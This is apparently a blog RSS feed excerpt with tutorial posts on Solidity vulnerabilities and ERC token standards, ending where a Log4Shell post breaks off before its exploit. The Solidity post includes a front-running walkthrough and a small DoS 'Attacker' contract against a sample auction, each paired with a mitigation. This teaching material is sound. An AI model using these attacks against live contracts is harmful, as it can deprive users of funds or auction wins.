&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;modifier&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;nonReentrant&lt;/span&gt;() {
    &lt;span style=&#34;color:#a6e22e&#34;&gt;require&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;locked&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Reentrant call detected&amp;#34;&lt;/span&gt;);
    &lt;span style=&#34;color:#a6e22e&#34;&gt;locked&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;_&lt;/span&gt;;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;locked&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Also you can use &lt;a href=&#34;https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard&#34;&gt;Openzeppelin ReentrancyGuard&lt;/a&gt; instead of creating your own modifier.&lt;/p&gt;
&lt;h1 id=&#34;integer-overflow&#34;&gt;Integer Overflow&lt;/h1&gt;
&lt;p&gt;Overflow occurs when we exceed the limit of any variable. For example &lt;code&gt;uint8&lt;/code&gt; can store value between 0 to 255, and if we try to store 256, it will store it as 0. We can try this by writing the following contract:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;pragma solidity &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt;0&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;

contract Overflow &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
    uint8 &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; val &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
    
    function &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;uint8 value&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; external &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
        val &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; value&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;// possible overflow
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; 
&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Try adding 255 and check the value. It will show 255. Now if you add 1, &lt;code&gt;val&lt;/code&gt; will become 0.&lt;/p&gt;
&lt;h4 id=&#34;how-to-mitigate-1&#34;&gt;How to mitigate&lt;/h4&gt;
&lt;p&gt;The best way to avoid overflow is to upgrade solidity version to 0.8.0 or later, to get built-in protection against overflow and underflow.&lt;/p&gt;
&lt;p&gt;Moreover you can perform check before performing a calculation like:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;pragma solidity &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt;0&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;

contract Overflow &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
    uint8 &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; val &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
    
    function &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;uint8 value&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; external &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
        require&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;val &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; value &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; 255&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Overflow&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
        val &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; value&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; 
&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;race-condition&#34;&gt;Race Condition&lt;/h1&gt;
&lt;p&gt;In Ethereum or any other chain, every transaction is first added to the mempool and then a miner adds the transaction to the blockchain while mining. There is a time gap of around 10 seconds or more between this two process: sending a transaction and getting it accepted into blockchain.&lt;/p&gt;
&lt;p&gt;To recreate the flaw, let create the following scenario:&lt;/p&gt;
&lt;p&gt;Deploy a ERC20 token as follow:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#34;@&lt;/span&gt;openzeppelin&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;contracts&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;token&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;ERC20&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;ERC20&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;sol&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;contract LOL is ERC20 {
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    constructor() ERC20(&amp;#34;&lt;/span&gt;LOL&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;, &amp;#34;&lt;/span&gt;LOL&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
        _mint&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;msg&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;sender&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 100000&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now deploy a &lt;code&gt;Marketplace&lt;/code&gt; contract which uses the above ERC20 token buying and selling:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;contract MarketPlace &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
    address &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; owner&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
    mapping&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;uint256 &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; uint256&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; prices&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
    mapping&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;uint256 &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; address&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; holder&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
    LOL lol&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;

    constructor&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;address a_&lt;span style=&#34;color:#f92672&#34;&gt;){&lt;/span&gt;
        owner &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; msg&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;sender&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
        lol &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; LOL&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;a_&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;

    function &lt;span style=&#34;color:#a6e22e&#34;&gt;buy&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;uint256 id&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; external &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
        lol&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;transferFrom&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;msg&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;sender&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; owner&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; prices&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;id&lt;span style=&#34;color:#f92672&#34;&gt;]);&lt;/span&gt;
        holder&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;id&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; msg&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;sender&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;

    function &lt;span style=&#34;color:#a6e22e&#34;&gt;changeprice&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;uint256 id&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; uint256 new_price&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; external &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
        prices&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;id&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; new_price&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;First use &lt;code&gt;changePrice(1,10)&lt;/code&gt; to set price of id 1 to 10. Now use two different metamask wallets, let A and B to do the attack. A will change the price and B will buy the id 1.
Before performing this approve &lt;code&gt;Marketplace&lt;/code&gt; contract for spending the ERC20 token on behalf of B, using the &lt;code&gt;approve(spender,amount)&lt;/code&gt; function. Set the amount higher than the price to make the attack possible. To be safe always approve only the price in real scenarios.&lt;/p&gt;
&lt;p&gt;Now call the following functions in order:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;buy(1)&lt;/code&gt; from B with lower gasprice, so that it takes more time to get accepted. Remember at this point the price of id 1 is 10, so 10 should be deducted from B&amp;rsquo;s wallet.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;changePrice(1,50)&lt;/code&gt; from A with higher gasprice, so that it is accepted instantly.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;After both the transactions are complete, you will see 50 is deducted from B wallet.&lt;/p&gt;
&lt;h4 id=&#34;scenario-2&#34;&gt;Scenario 2&lt;/h4&gt;
&lt;p&gt;There can be another scenario for this attack. Imagine you created a Quiz contract and the first one to respond with correct answer wins ether. Now a valid winner submits his answer in the mempool. A malicious miner notice that transaction, copies the values and send a transaction with the correct answer. If the miner&amp;rsquo;s transaction gets added to the block, he will win the ether instead of the actual winner.&lt;/p&gt;
&lt;h4 id=&#34;how-to-mitigate-2&#34;&gt;How to mitigate&lt;/h4&gt;
&lt;p&gt;We can&amp;rsquo;t prevent front-run but we can follow necessary steps based on the scenario.
For example in the first scenario, only approve for the amount shown as price.
In the second scenario, we can use some kind of encryption to hide the answer from public.&lt;/p&gt;
&lt;h1 id=&#34;dos-attacks&#34;&gt;DoS Attacks&lt;/h1&gt;
&lt;p&gt;DoS Attack occurs when a malicious hacker succeeds in creating a scenario where your contract functions always fails. For example if we consider the following &lt;code&gt;Auction&lt;/code&gt; contract:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;pragma solidity &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt;0&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;8&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;

contract Auction &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
    address &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; curWinner&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
    uint256 &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; curBid&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
    
    function &lt;span style=&#34;color:#a6e22e&#34;&gt;bid&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; payable external &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
        uint256 value &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; msg&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
        require&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;value &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; curBid&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;curWinner &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; address&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
            payable&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;curWinner&lt;span style=&#34;color:#f92672&#34;&gt;).&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;transfer&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;curBid&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
        &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
        curWinner &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; msg&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;sender&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
        curBid &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; value&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; 
&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Here while bidding, the function first send the value of 2nd highest bid back and then updates the &lt;code&gt;curBid&lt;/code&gt; and &lt;code&gt;curWinner&lt;/code&gt;. If a hacker creates a contract through which he can place a bid but any transfer back to the contract will always fail then the winner will never update and he will be winner with any bid. The hacker can achive that using the following &lt;code&gt;Attacker&lt;/code&gt; contract:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;contract Attacker&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
    Auction auction&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;

    constructor&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;address a&lt;span style=&#34;color:#f92672&#34;&gt;){&lt;/span&gt;
        auction &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Auction&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;

    function &lt;span style=&#34;color:#a6e22e&#34;&gt;placeBid&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; payable external &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
        auction&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;bid&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;value&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; msg&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}();&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;

    receive&lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; external payable  &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
        revert&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Hacked&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In &lt;code&gt;Attacker&lt;/code&gt; contract, ether cannot be transferred back as the fallback function &lt;code&gt;receive()&lt;/code&gt; will always revert it.&lt;/p&gt;
&lt;p&gt;Another scenario includes looping over dynamic size arrays. If the array becomes too large than it will run out of gas and revert.&lt;/p&gt;
&lt;h4 id=&#34;how-to-mitigate-3&#34;&gt;How to mitigate&lt;/h4&gt;
&lt;p&gt;To avoid function failure due to transfer failure, implement pull over push pattern. In this pattern, you will not send the amount while calling the &lt;code&gt;bid()&lt;/code&gt; function but a separate function will be there so that the losing bidders can withdraw their bids.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;References:&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/crytic/not-so-smart-contracts&#34;&gt;(Not So) Smart Contracts&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://medium.com/coinmonks/smart-contracts-common-vulnerabilities-solidity-e64c5506b7f4&#34;&gt;Smart Contracts common vulnerabilities (solidity)&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
</content>
    </item>
    
    <item>
      <title>Erc Standards</title>
      <link>https://somesh-banerjee.github.io/blogs/posts/erc-standards/</link>
      <pubDate>Mon, 30 May 2022 15:55:13 +0530</pubDate>
      
      <guid>https://somesh-banerjee.github.io/blogs/posts/erc-standards/</guid>
      <description>ERC Standards ERC stands for Ethereum Request for Comments. This documents contains rules for different token standards. If you want to create any Ethereum based token you have to follow this rules.
Different ERC Standards Image Source: Blockchain Council
ERC20 This is is the most common Token standard and is commonly used by ICOs. It is a fungible token where all the token holds the same value. This standard can be used as a currency.</description>
      <content>&lt;h1 id=&#34;erc-standards&#34;&gt;ERC Standards&lt;/h1&gt;
&lt;p&gt;ERC stands for Ethereum Request for Comments. This documents contains rules for different token standards. If you want to create any Ethereum based token you have to follow this rules.&lt;/p&gt;
&lt;h1 id=&#34;different-erc-standards&#34;&gt;Different ERC Standards&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://somesh-banerjee.github.io/blogs/blogs/erc-s/1.jpg&#34; alt=&#34;&#34;&gt;
Image Source: &lt;a href=&#34;https://www.blockchain-council.org/wp-content/uploads/2022/02/ERC-TOKEN.jpg&#34;&gt;Blockchain Council&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;erc20&#34;&gt;ERC20&lt;/h2&gt;
&lt;p&gt;This is is the most common Token standard and is commonly used by ICOs. It is a fungible token where all the token holds the same value. This standard can be used as a currency. The basic rule for this standard are&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;The tokens can be transferred from one account to another&lt;/li&gt;
&lt;li&gt;The balance for each account can be checked.&lt;/li&gt;
&lt;li&gt;The Total supply of the token can be checked.&lt;/li&gt;
&lt;li&gt;The owner can approve a third party to spent some amount of his token&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;erc721&#34;&gt;ERC721&lt;/h2&gt;
&lt;p&gt;This is the most basic standard for NFTs(Non Fungible Tokens). NFTs are unique and each token holds a different value. The smart contract keep track of the tokens with the help of Token ID. The token IDs are mapped to owner&amp;rsquo;s wallet address. Owner means the owner of that particular token.&lt;/p&gt;
&lt;p&gt;Most digital assets like images, videos, 3D models are sold in the Metaverse marketplace as this NFT. The token cannot store the digital asset onchain as it will be pretty large. Instead it is stored somewhere else like IPFS or centralized server and the link to the asset is stored in the token as URI. The token mainly represents the ownership of that asset.&lt;/p&gt;
&lt;p&gt;You can find my ERC721 Marketplace &lt;a href=&#34;https://metaverse-market.vercel.app/&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&#34;erc1155&#34;&gt;ERC1155&lt;/h2&gt;
&lt;p&gt;This token standard is normally used in games where there are different kind of tokens with different quantity. Let say we have a have a game of collecting cards with two two types of cards as token: Common Cards and Rare Cards. The availability of the Common card is 100 and Rare is 20. If we treat each type of cards as ERC20 token then you can say that the ERC1155 is maintaining multiple ERC20 tokens.&lt;/p&gt;
&lt;p&gt;Also let say in ERC1155 there are many tokens and each of their quantity / availability is 1, then we can say that the contract is similar to ERC721 where each token is unique.&lt;/p&gt;
&lt;p&gt;In ERC1155, the smart contract keep tracks of token with the help of both Token ID and Account Address. It stores the number as how many accounts have the given token Id and how much each account has.&lt;/p&gt;
&lt;h2 id=&#34;erc725&#34;&gt;ERC725&lt;/h2&gt;
&lt;p&gt;This standard is used for creating digital identity. The identity contract can identify other contracts. This is required because in decentralized governance we need the identity of different users without using any centralized server.&lt;/p&gt;
&lt;h1 id=&#34;implementing-the-token-standards&#34;&gt;Implementing the Token Standards&lt;/h1&gt;
&lt;p&gt;The easiest way to implement ERC20, ERC721 and ERC1155 token is using &lt;a href=&#34;https://www.openzeppelin.com/contracts&#34;&gt;OpenZeppelin Contracts&lt;/a&gt;. Here the basic functionalities of all the standards are already written and tested. Your token will only inherit those contracts. You can also add your own functions as per the requirement. To start you go the wizard, and then select which standard you want to create. You can select what features you want in your contract like mintable, pausable, burnable, etc and it will be added. Once satisfied you can copy the code to remix and deploy it the network you want to.&lt;/p&gt;
&lt;h1 id=&#34;what-are-eips&#34;&gt;What are EIPs&lt;/h1&gt;
&lt;p&gt;Ethereum Improvement Proposals (EIPs) describes the standard of Ethereum platform. It says what steps need to follow to make a improvement in the token standards. While creating a new ERC standard the author has to follow these steps.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;References:&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&#34;https://101blockchains.com/erc-standards/&#34;&gt;101 Blockchains&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.blockchain-council.org/ethereum/erc-token-standards/&#34;&gt;Blockchain Council&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://docs.openzeppelin.com/contracts/4.x/&#34;&gt;OpenZeppelin&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://eips.ethereum.org/EIPS/eip-1&#34;&gt;EIP-1&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
</content>
    </item>
    
    <item>
      <title>Log4shell</title>
      <link>https://somesh-banerjee.github.io/blogs/posts/log4shell/</link>
      <pubDate>Fri, 14 Jan 2022 17:25:22 +0530</pubDate>
      
      <guid>https://somesh-banerjee.github.io/blogs/posts/log4shell/</guid>
      <description>Introduction Log4j is a logging framework for Java. A logging framework is better than just printing the logs with a print statement because you don&amp;rsquo;t need to comment the print statements. You just need to maintain a configure file which tells what type of logs to store and write the code with different log levels as:
logging.ERROR(&amp;quot;error&amp;quot;); logging.WARN(&amp;quot;warning&amp;quot;); Now a logger logs everything. Every interactions with the application along with the time and ip address.</description>
      <content>&lt;h1 id=&#34;introduction&#34;&gt;Introduction&lt;/h1&gt;
&lt;p&gt;Log4j is a logging framework for Java. A logging framework is better than just printing the logs with a print statement because you don&amp;rsquo;t need to comment the print statements. You just need to maintain a configure file which tells what type of logs to store and write the code with different log levels as:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;logging.ERROR(&amp;quot;error&amp;quot;);
logging.WARN(&amp;quot;warning&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now a logger logs everything. Every interactions with the application along with the time and ip address. But the vulnerability in log4j happens when the attacker can craft or manipulate what is logged. Let say it is logging the username and the username is like this&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://somesh-banerjee.github.io/blogs/blogs/log4j/1.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Now that username is the actual format used for RCE using log4j. The exploit is:&lt;/p&gt;
